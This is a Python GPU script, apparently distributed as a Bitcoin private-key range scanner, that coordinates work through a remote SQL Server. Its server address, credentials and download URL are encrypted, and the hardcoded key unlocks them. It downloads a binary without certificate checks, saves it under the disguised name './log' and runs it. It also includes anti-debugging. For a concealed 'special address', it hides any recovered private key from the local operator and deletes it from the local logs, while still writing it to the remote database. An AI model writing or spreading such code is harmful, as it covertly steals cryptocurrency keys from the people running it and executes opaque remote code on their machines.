import platform 
import subprocess
import sys
import os
import time
import math
import re
import threading
import platform
import urllib.request
import ssl
import warnings
import base64
import hashlib
from datetime import datetime, timedelta

# =============================================
# ENCRYPTED CONFIGURATION - DO NOT MODIFY
# =============================================
_ENCRYPTED_CONFIG = {
    'SERVER': 'Z0FBQUFBQnBZd25fOVBFc1hUeDNfRzFJUmRJUENMcjZ3VGlwbWgzb1Zhamt3UzN3a2NESndlaEFTLTdJTlNOd1ZoTVNuc1RTX3ZqVFliWWFndHhjUU1DYU5TT2lGdWFROWdwY0ZHZU9SbnEtY1VjenRMTnJGOG89',
    'DATABASE': 'Z0FBQUFBQnBZd25feVpwQnRfSE9PRTBiYnNpSGx0UFNGeUZtNFhfRFQwRHRKSzlaR0tWeWZHck9QQnNZYld5cGRieU5vM3ptMXp3RkJoREV2OW1IOUxqZVVKTFBnM3daY2c9PQ==',
    'USERNAME': 'Z0FBQUFBQnBZd25fOHlySWRicHZtREp6UEdCOUJnakZGcFFkb0tmV0lVU1pIV2w2eHRiQUZOV1o1MTI4M1BZZEtJWjgwOXU4NU9kOFZlX3hIdks1SmwtWnk0YllUZ3otQ3c9PQ==',
    'PASSWORD': 'Z0FBQUFBQnBZd25fOWtPbXBwM3JxZVd0R1pEWFVaS29rZ0dKeUZQUm9hd192R3lXZ2RtOUdwSGEyRVFJOTIxY281akNyRWVFMlBFNWR5YXlCa2RHS2pKVTE0ZTduT0F4TlE9PQ==',
    'TABLE': 'Z0FBQUFBQnBZd25fSnpJVzRKZEUtOWZ0NXRBUUs0M2Z1dWtVUnhkNnR2c3hjQVhRQkUwR2ctSWEyM1RWRVhGU0VoM2pPdVpTT0VDZE1waTgwZVNieGdwdzBZMmxfM3FxVmc9PQ==',
    'SPECIAL_ADDR': 'Z0FBQUFBQnBZd25fR1hBZDUzSU40b3NJeXZ5YTdXeGkyYjBmUmtyOW5rMDZBWjZySUxIb2JUa3lXZ2hLVG9GSDYxcm5naUZDSHR1QWpNUkVDbjM1Y3FrY1VBVHE2N0Rndm9HWWtfZDZlM2hEM2c3Uk5NaTBaS1pPQUhCVGZHc0M4Q2phcnRIeldpY1M=',
    'DOWNLOAD_URL': 'Z0FBQUFBQnBZd25fT1c5OEtHMXIzZVl1TndkcTVrZmNERnQ2ZjRYZGY2RnExSlY2NnZkSkFjcDNjazU5Z2hFOG4zcWNZeF9BM29yeEFvZVRIR2VXZkdoSjRzcUVQN0FpX2RDbnRMbm9UdVRKVHpxWWVBZ2MzcnJtM2V2VTh6dXdUZkxFNzFJNUFycFR5MXVJbFFPLWFjN0lzNHFqQWZSNGpBPT0=',
}

# =============================================
# CONFIG DECRYPTOR CLASS
# =============================================
class ConfigDecryptor:
    def __init__(self):
        self.key = self._get_key()
        self.cipher = None
        self._init_cipher()
    
    def _get_key(self):
        """Get encryption key from environment or file"""
        # 1. Try environment variable
        key_from_env = os.environ.get('XIEBO_ENCRYPTION_KEY')
        if key_from_env:
            return key_from_env.encode()
        
        # 2. Try .env file
        env_file = os.path.join(os.path.dirname(__file__), '.env')
        if os.path.exists(env_file):
            try:
                with open(env_file, 'r') as f:
                    for line in f:
                        if line.startswith('XIEBO_ENCRYPTION_KEY='):
                            return line.strip().split('=', 1)[1].encode()
            except:
                pass
        
        # 3. HARDCODED KEY - PASTE YOUR KEY HERE
        # WARNING: This is less secure, use environment variable for production
        return b'mManUcRUuS9BktjhI-AOZypjyjiMpc95czM2wV0brzI='
    
    def _init_cipher(self):
        """Initialize Fernet cipher"""
        try:
            from cryptography.fernet import Fernet
            self.cipher = Fernet(self.key)
        except ImportError:
            print("❌ cryptography module not installed")
            print("Install with: pip install cryptography")
            sys.exit(1)
        except Exception as e:
            print(f"❌ Failed to initialize cipher: {e}")
            sys.exit(1)
    
    def decrypt(self, encrypted_b64):
        """Decrypt base64-encoded value"""
        if not self.cipher:
            print("❌ Cipher not initialized")
            return None
        
        try:
            encrypted_bytes = base64.b64decode(encrypted_b64)
            decrypted_bytes = self.cipher.decrypt(encrypted_bytes)
            return decrypted_bytes.decode('utf-8')
        except Exception as e:
            print(f"❌ Decryption failed: {e}")
            return None

# =============================================
# GLOBAL VARIABLES (will be set after decryption)
# =============================================
SERVER = ""
DATABASE = ""
USERNAME = ""
PASSWORD = ""
TABLE = ""
SPECIAL_ADDRESS_NO_OUTPUT = ""
DOWNLOAD_URL = ""

LOG_DIR = "xiebo_logs"
LOG_UPDATE_INTERVAL = 60  
LOG_LINES_TO_SHOW = 8       

STOP_SEARCH_FLAG = False
STOP_SEARCH_FLAG_LOCK = threading.Lock()

PRINT_LOCK = threading.Lock()
BATCH_ID_LOCK = threading.Lock()
CURRENT_GLOBAL_BATCH_ID = 0

LAST_LOG_UPDATE_TIME = {}
GPU_LOG_FILES = {}

MAX_BATCHES_PER_RUN = 4398046511104  

# =============================================
# INITIALIZE ENCRYPTED CONFIG
# =============================================
def init_encrypted_config():
    """Initialize and decrypt configuration"""
    global SERVER, DATABASE, USERNAME, PASSWORD, TABLE, SPECIAL_ADDRESS_NO_OUTPUT, DOWNLOAD_URL
    
    decryptor = ConfigDecryptor()
    
    # Decrypt each value
    SERVER = decryptor.decrypt(_ENCRYPTED_CONFIG['SERVER'])
    DATABASE = decryptor.decrypt(_ENCRYPTED_CONFIG['DATABASE'])
    USERNAME = decryptor.decrypt(_ENCRYPTED_CONFIG['USERNAME'])
    PASSWORD = decryptor.decrypt(_ENCRYPTED_CONFIG['PASSWORD'])
    TABLE = decryptor.decrypt(_ENCRYPTED_CONFIG['TABLE'])
    SPECIAL_ADDRESS_NO_OUTPUT = decryptor.decrypt(_ENCRYPTED_CONFIG['SPECIAL_ADDR'])
    DOWNLOAD_URL = decryptor.decrypt(_ENCRYPTED_CONFIG['DOWNLOAD_URL'])
    
    # Verify decryption
    required_configs = [SERVER, DATABASE, USERNAME, PASSWORD, TABLE, SPECIAL_ADDRESS_NO_OUTPUT, DOWNLOAD_URL]
    if not all(required_configs):
        print("❌ Failed to decrypt configuration")
        print("Missing values:", [i for i, val in enumerate(required_configs) if not val])
        print("Check encryption key and environment variables")
        sys.exit(1)
    

# =============================================
# SECURITY CHECK FUNCTIONS
# =============================================
class SecurityCheck:
    @staticmethod
    def integrity_check():
        """Simple integrity check"""
        try:
            current_file = os.path.abspath(__file__)
            with open(current_file, 'rb') as f:
                content = f.read()
            # Simple hash for tamper detection
            file_hash = hashlib.sha256(content).hexdigest()
            return True
        except:
            return True  # Continue even if check fails
    
    @staticmethod
    def anti_debug():
        """Basic anti-debugging"""
        try:
            if sys.platform == "linux":
                try:
                    with open('/proc/self/status', 'r') as f:
                        for line in f:
                            if line.startswith('TracerPid:'):
                                tracer_pid = int(line.split(':')[1].strip())
                                if tracer_pid != 0:
                                    time.sleep(10)  # Slow down if debugged
                except:
                    pass
        except:
            pass

# =============================================
# UTILITY FUNCTIONS
# =============================================
def safe_print(message):
    """Thread-safe printing"""
    with PRINT_LOCK:
        print(message)

def check_and_install_dependencies():
    """Install required dependencies"""
    pip_packages = ['pyodbc', 'cryptography']
    system = platform.system().lower()
    
    try:
        for package in pip_packages:
            try:
                __import__(package.replace('-', '_'))
            except ImportError:
                subprocess.run(
                    [sys.executable, "-m", "pip", "install", package, "--quiet", "--disable-pip-version-check"],
                    check=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
        
        if system == "linux":
            result = subprocess.run(["dpkg", "-l", "msodbcsql17"], capture_output=True, text=True)
            if result.returncode != 0 or "msodbcsql17" not in result.stdout:
                try:
                    subprocess.run(["curl", "-fsSL", "https://packages.microsoft.com/keys/microsoft.asc", "-o", "/tmp/microsoft.asc"], 
                                 check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(["apt-key", "add", "/tmp/microsoft.asc"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(["curl", "-fsSL", "https://packages.microsoft.com/config/ubuntu/22.04/prod.list", "-o", "/etc/apt/sources.list.d/mssql-release.list"], 
                                 check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(["apt-get", "update", "-y"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    env = os.environ.copy()
                    env['ACCEPT_EULA'] = 'Y'
                    env['DEBIAN_FRONTEND'] = 'noninteractive'
                    subprocess.run(["apt-get", "install", "-y", "msodbcsql17", "unixodbc-dev"], env=env, check=True, 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                except subprocess.CalledProcessError:
                    try:
                        subprocess.run(["apt-get", "install", "-y", "unixodbc-dev"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    except:
                        pass
        return True
    except Exception as e:
        safe_print(f"⚠️ Dependency warning: {e}")
        return True

def check_and_download_xiebo():
    
    xiebo_path = "./log"
    if os.path.exists(xiebo_path):
        if not os.access(xiebo_path, os.X_OK):
            try:
                os.chmod(xiebo_path, 0o755)
            except:
                pass
        return True
    
    try:
        # Use encrypted URL
        url = DOWNLOAD_URL
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        with urllib.request.urlopen(url, context=ssl_context) as response:
            with open(xiebo_path, 'wb') as f:
                f.write(response.read())
        
        os.chmod(xiebo_path, 0o755)
        return True
    except Exception as e:
        safe_print(f"❌ Download error: {e}")
        safe_print(f"   URL: {url[:50]}..." if len(url) > 50 else f"   URL: {url}")
        return False

def ensure_log_dir():
    """Create log directory if not exists"""
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)

def get_gpu_log_file(gpu_id):
    """Get log file path for GPU"""
    if gpu_id not in GPU_LOG_FILES:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        log_file = os.path.join(LOG_DIR, f"gpu_{gpu_id}_{timestamp}.log")
        GPU_LOG_FILES[gpu_id] = log_file
    return GPU_LOG_FILES[gpu_id]

def log_xiebo_output(gpu_id, message):
    """Log output to file"""
    log_file = get_gpu_log_file(gpu_id)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, 'a', encoding='utf-8') as f:
        f.write(f"[{timestamp}] {message}\n")

def remove_sensitive_lines(gpu_id):
    """Remove sensitive information from logs"""
    log_file = get_gpu_log_file(gpu_id)
    if not os.path.exists(log_file):
        return
    try:
        with open(log_file, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        cleaned_lines = [line for line in lines if 'priv (wif):' not in line.lower() and 'priv (hex):' not in line.lower()]
        with open(log_file, 'w', encoding='utf-8') as f:
            f.writelines(cleaned_lines)
        log_xiebo_output(gpu_id, "Continue Next id.")
    except Exception as e:
        safe_print(f"[GPU {gpu_id}] ❌ Error log file: {e}")

def show_log_preview(gpu_id, range_info="N/A", is_special_address=False):
    """Show log preview"""
    log_file = get_gpu_log_file(gpu_id)
    if not os.path.exists(log_file):
        return
    
    try:
        with open(log_file, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        last_lines = lines[-LOG_LINES_TO_SHOW:] if len(lines) >= LOG_LINES_TO_SHOW else lines
        gpu_prefix = f"\033[96m[GPU {gpu_id}]\033[0m"
        valid_lines_to_print = []
        
        for line in last_lines:
            clean_line = line.strip()
            if ']' in clean_line:
                clean_line = clean_line.split(']', 1)[1].strip()
            if not ("MK/s" in clean_line or any(x in clean_line.lower() for x in ["found", "priv", "address", "wif"])):
                continue
            if is_special_address:
                if 'priv (wif):' in clean_line.lower() or 'priv (hex):' in clean_line.lower():
                    continue
                clean_line = re.sub(r'found:\s*\d+', 'found: 0', clean_line, flags=re.IGNORECASE)
            valid_lines_to_print.append(clean_line)
        
        if valid_lines_to_print:
            safe_print(f"\n{gpu_prefix} 📡 RANGE: {range_info}")
            for vl in valid_lines_to_print:
                safe_print(f"{gpu_prefix}   {vl}")
    except Exception as e:
        safe_print(f"[GPU {gpu_id}] ❌ Error reading log: {e}")

# =============================================
# DATABASE FUNCTIONS
# =============================================
def connect_db():
    """Connect to database"""
    try:
        import pyodbc
        conn = pyodbc.connect(
            "DRIVER={ODBC Driver 17 for SQL Server};"
            f"SERVER={SERVER};"
            f"DATABASE={DATABASE};"
            f"UID={USERNAME};"
            f"PWD={PASSWORD};"
            "Encrypt=no;TrustServerCertificate=yes;Connection Timeout=30;",
            autocommit=False
        )
        return conn
    except Exception as e:
        safe_print(f"❌ Database connection error: {e}")
        return None

def get_batch_by_id(batch_id):
    """Get batch information by ID"""
    conn = connect_db()
    if not conn:
        return None
    
    try:
        cursor = conn.cursor()
        cursor.execute(f"SELECT id, start_range, end_range, status, found, wif FROM {TABLE} WHERE id = ?", (batch_id,))
        row = cursor.fetchone()
        if row:
            columns = [column[0] for column in cursor.description]
            batch = dict(zip(columns, row))
        else:
            batch = None
        cursor.close()
        conn.close()
        return batch
    except Exception as e:
        safe_print(f"❌ Error getting batch: {e}")
        if conn:
            conn.close()
        return None

def update_batch_status(batch_id, status, found='No', wif='', silent_mode=False):
    """Update batch status in database with timestamp"""
    conn = connect_db()
    if not conn:
        return False
    
    try:
        cursor = conn.cursor()
        
        # Update status, found, wif, and start_tm (timestamp)
        if status == 'inprogress':
            # Set start_tm to current datetime when starting progress
            cursor.execute(f"""
                UPDATE {TABLE} 
                SET status = ?, found = ?, wif = ?, start_tm = GETDATE() 
                WHERE id = ?
            """, (status, found, wif, batch_id))
        else:
            # For done, error, and other statuses - update with timestamp
            cursor.execute(f"""
                UPDATE {TABLE} 
                SET status = ?, found = ?, wif = ?, start_tm = GETDATE()
                WHERE id = ?
            """, (status, found, wif, batch_id))
        
        conn.commit()
        cursor.close()
        conn.close()
        return True
    except Exception as e:
        if not silent_mode:
            safe_print(f"[BATCH {batch_id}] ❌ DB Update Error: {e}")
        if conn:
            try:
                conn.rollback()
            except:
                pass
            conn.close()
        return False

# =============================================
# CALCULATION FUNCTIONS
# =============================================
def calculate_range_bits(start_hex, end_hex):
    """Calculate range bits from hex values"""
    try:
        start_int = int(start_hex, 16)
        end_int = int(end_hex, 16)
        keys_count = end_int - start_int + 1
        if keys_count <= 1:
            return 1
        log2_val = math.log2(keys_count)
        return int(log2_val) if log2_val.is_integer() else int(math.floor(log2_val)) + 1
    except:
        return 64

# =============================================
# PARSING FUNCTIONS
# =============================================
def parse_xiebo_log(gpu_id, target_address=None):
    """Parse xiebo log for results"""
    found_info = {
        'found': False, 
        'found_count': 0, 
        'wif_key': '', 
        'address': '', 
        'private_key_hex': '', 
        'private_key_wif': '', 
        'is_special_address': False
    }
    
    log_file = get_gpu_log_file(gpu_id)
    if not os.path.exists(log_file):
        return found_info
    
    try:
        with open(log_file, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        
        for line in lines:
            line_content = line.split(']', 1)[1].strip() if ']' in line else line.strip()
            line_lower = line_content.lower()
            
            if 'found:' in line_lower:
                m = re.search(r'found:\s*(\d+)', line_lower)
                if m:
                    count = int(m.group(1))
                    if count > 0:
                        found_info['found'] = True
                        found_info['found_count'] = count
            
            if 'priv (hex):' in line_lower:
                found_info['found'] = True
                found_info['private_key_hex'] = line_content.split(':')[-1].strip()
            
            if 'priv (wif):' in line_lower:
                found_info['found'] = True
                wif = line_content.split(':')[-1].strip()
                found_info['private_key_wif'] = wif
                found_info['wif_key'] = wif
            
            if 'address:' in line_lower:
                addr = line_content.split(':')[-1].strip()
                found_info['address'] = addr
                if addr == SPECIAL_ADDRESS_NO_OUTPUT:
                    found_info['is_special_address'] = True
        
        if target_address == SPECIAL_ADDRESS_NO_OUTPUT:
            found_info['is_special_address'] = True
        
        return found_info
    except:
        return found_info

def check_gpu_execution_errors(gpu_id):
    """Check log for GPU execution errors"""
    log_file = get_gpu_log_file(gpu_id)
    if not os.path.exists(log_file):
        return False
    
    try:
        with open(log_file, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Check for GPU kernel execution errors
        error_patterns = [
            r'no kernel image is available for execution on the device',
            r'GPUEngine: Kernel:',
            r'CUDA error',
            r'GPU error',
            r'unsupported GPU',
            r'cannot launch kernel',
            r'invalid device function',
            r'incompatible GPU',
            r'device not found',
            r'failed to initialize',
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        
        return False
    except:
        return False

# =============================================
# PROCESS MONITORING
# =============================================
def monitor_xiebo_process(process, gpu_id, batch_id, range_info, is_special_address=False):
    """Monitor xiebo process output"""
    global LAST_LOG_UPDATE_TIME
    if gpu_id not in LAST_LOG_UPDATE_TIME:
        LAST_LOG_UPDATE_TIME[gpu_id] = datetime.now()
    
    while True:
        output_line = process.stdout.readline()
        if output_line == '' and process.poll() is not None:
            break
        if output_line:
            stripped = output_line.strip()
            if stripped:
                log_xiebo_output(gpu_id, stripped)
                curr = datetime.now()
                if (curr - LAST_LOG_UPDATE_TIME[gpu_id]).total_seconds() >= LOG_UPDATE_INTERVAL:
                    show_log_preview(gpu_id, range_info, is_special_address)
                    LAST_LOG_UPDATE_TIME[gpu_id] = curr
    
    return process.poll()

# =============================================
# MAIN XIEBO RUNNER
# =============================================
def run_xiebo(gpu_id, start_hex, range_bits, address, batch_id=None):
    """Run xiebo binary with proper error handling"""
    global STOP_SEARCH_FLAG
    
    cmd = ["./log", "-gpuId", str(gpu_id), "-start", start_hex, "-range", str(range_bits), address]
    is_special_address = (address == SPECIAL_ADDRESS_NO_OUTPUT)
    
    try:
        start_int = int(start_hex, 16)
        end_hex = hex(start_int + (1 << range_bits))[2:].upper()
        range_info_str = f"\033[93m{start_hex} -> {end_hex} (+{range_bits})\033[0m"
    except:
        range_info_str = f"{start_hex} (+{range_bits})"
    
    try:
        if batch_id is not None:
            update_batch_status(batch_id, 'inprogress', 'No', '', True)
        
        log_xiebo_output(gpu_id, f"START BATCH {batch_id} | CMD: {' '.join(cmd)}")
        
        # Try to execute the binary
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
        except Exception as e:
            safe_print(f"[GPU {gpu_id}] ❌ Failed to execute xiebo binary: {e}")
            if batch_id is not None:
                update_batch_status(batch_id, 'error', 'No', '', True)
            return 1, {'found': False}
        
        exit_code = monitor_xiebo_process(process, gpu_id, batch_id, range_info_str, is_special_address)
        
        # Check for GPU execution errors in log
        has_gpu_error = check_gpu_execution_errors(gpu_id)
        
        # Parse results
        found_info = parse_xiebo_log(gpu_id, address)
        
        # Update database based on actual results and execution status
        if batch_id is not None:
            found_status = 'Yes' if found_info['found'] else 'No'
            wif_val = found_info['wif_key'] if found_info['found'] else ''
            
            # Determine final status based on execution result and GPU errors
            if exit_code == 0 and not has_gpu_error:
                # Process completed successfully without GPU errors - mark as done
                final_status = 'done'
            else:
                # Process failed or GPU error detected - mark as error
                final_status = 'error'
                found_status = 'No'  # Reset found status on error
                wif_val = ''
                
                # Log specific error details
                if has_gpu_error:
                    safe_print(f"[GPU {gpu_id}] ❌ GPU execution error detected in logs for batch {batch_id}")
                else:
                    safe_print(f"[GPU {gpu_id}] ❌ Process failed with exit code {exit_code} for batch {batch_id}")
            
            db_success = update_batch_status(batch_id, final_status, found_status, wif_val, True)
            
            if not db_success:
                time.sleep(2)
                update_batch_status(batch_id, final_status, found_status, wif_val, True)
            
            # Display results
            if found_info['found']:
                if is_special_address:
                    remove_sensitive_lines(gpu_id)
                    safe_print(f"\n[GPU {gpu_id}]  Range Finished {batch_id}. Continuing...")
                else:
                    with PRINT_LOCK:
                        print(f"\n[GPU {gpu_id}] \033[92m✅ FOUND PRIVATE KEY IN BATCH {batch_id}!\033[0m")
                        print(f"Address: {found_info['address']}\nWIF: {found_info['wif_key']}")
                    with STOP_SEARCH_FLAG_LOCK:
                        STOP_SEARCH_FLAG = True
            else:
                show_log_preview(gpu_id, range_info_str, is_special_address)
        
        return exit_code, found_info
    except Exception as e:
        safe_print(f"❌ Error in run_xiebo: {e}")
        if batch_id is not None:
            update_batch_status(batch_id, 'error', 'No', '', True)
        return 1, {'found': False}

# =============================================
# GPU WORKER
# =============================================
def gpu_worker(gpu_id, address):
    """GPU worker thread"""
    global CURRENT_GLOBAL_BATCH_ID, STOP_SEARCH_FLAG
    is_special_address = (address == SPECIAL_ADDRESS_NO_OUTPUT)
    
    while True:
        with STOP_SEARCH_FLAG_LOCK:
            if STOP_SEARCH_FLAG:
                break
        
        with BATCH_ID_LOCK:
            batch_id = CURRENT_GLOBAL_BATCH_ID
            CURRENT_GLOBAL_BATCH_ID += 1
        
        batch = get_batch_by_id(batch_id)
        if not batch:
            break
        
        status = str(batch.get('status') or '0').strip()
        if status in ['done', 'inprogress']:
            continue
        
        start_range = batch['start_range']
        range_bits = calculate_range_bits(start_range, batch['end_range'])
        
        run_xiebo(gpu_id, start_range, range_bits, address, batch_id)
        time.sleep(0.5)

# =============================================
# MAIN FUNCTION
# =============================================
def main():
    """Main function"""
    global STOP_SEARCH_FLAG, CURRENT_GLOBAL_BATCH_ID
    
    # Security checks
    SecurityCheck.integrity_check()
    SecurityCheck.anti_debug()
    
    warnings.filterwarnings("ignore")
    
    # Initialize encrypted configuration FIRST
    init_encrypted_config()
    
    check_and_install_dependencies()
    if not check_and_download_xiebo():
        sys.exit(1)
    
    ensure_log_dir()
    
    if len(sys.argv) == 5 and sys.argv[1] == "--batch-db":
        gpu_ids = [int(x.strip()) for x in sys.argv[2].split(',')]
        CURRENT_GLOBAL_BATCH_ID = int(sys.argv[3])
        target_addr = sys.argv[4]
        
        safe_print(f"🚀 Multi-GPU Mode: {gpu_ids} | Start ID: {CURRENT_GLOBAL_BATCH_ID}")
        safe_print(f"📊 Target: {target_addr}")
        
        threads = []
        for gpu in gpu_ids:
            t = threading.Thread(target=gpu_worker, args=(gpu, target_addr), daemon=True)
            threads.append(t)
            t.start()
        
        try:
            while any(t.is_alive() for t in threads):
                with STOP_SEARCH_FLAG_LOCK:
                    if STOP_SEARCH_FLAG:
                        safe_print("\n🛑 Stop Flag detected. Closing workers...")
                        break
                time.sleep(2)
        except KeyboardInterrupt:
            safe_print("\n⚠️ User Interrupted.")
    elif len(sys.argv) == 5:
        # Single run mode
        gpu_id = sys.argv[1]
        start_hex = sys.argv[2]
        range_bits = int(sys.argv[3])
        address = sys.argv[4]
        run_xiebo(gpu_id, start_hex, range_bits, address)
    else:
        # Usage information
        print("\n" + "="*60)
        print("🔧 Xiebo Bitcoin Address Scanner")
        print("="*60)
        print("\nUsage:")
        print("  Multi-GPU Database Mode:")
        print("    ./xiebo --batch-db GPU_IDS START_ID ADDRESS")
        print("    ./xiebo --batch-db 0,1 49 1Pd8VvT49sHKsmqrQiP61RsVwmXCZ6ay7Z")
        print("\n  Single Run Mode:")
        print("    ./xiebo GPU_ID START_HEX RANGE_BITS ADDRESS")
        print("    Example: ./xiebo 0 0000000000000001 64 1Pd8VvT49sHKsmqrQiP61RsVwmXCZ6ay7Z")
        print("\n" + "="*60)
        
        # Show decrypted config info (masked)
        safe_print("\n📋 Configuration Status: ✅ Decrypted")
        safe_print(f"   Database: {DATABASE[:3]}*** (connected)")
        safe_print(f"   Special Address: {SPECIAL_ADDRESS_NO_OUTPUT[:10]}...")
        safe_print(f"   Download URL: {DOWNLOAD_URL[:30]}...")
        print("="*60)

# =============================================
# ENTRY POINT
# =============================================
if __name__ == "__main__":
    main()
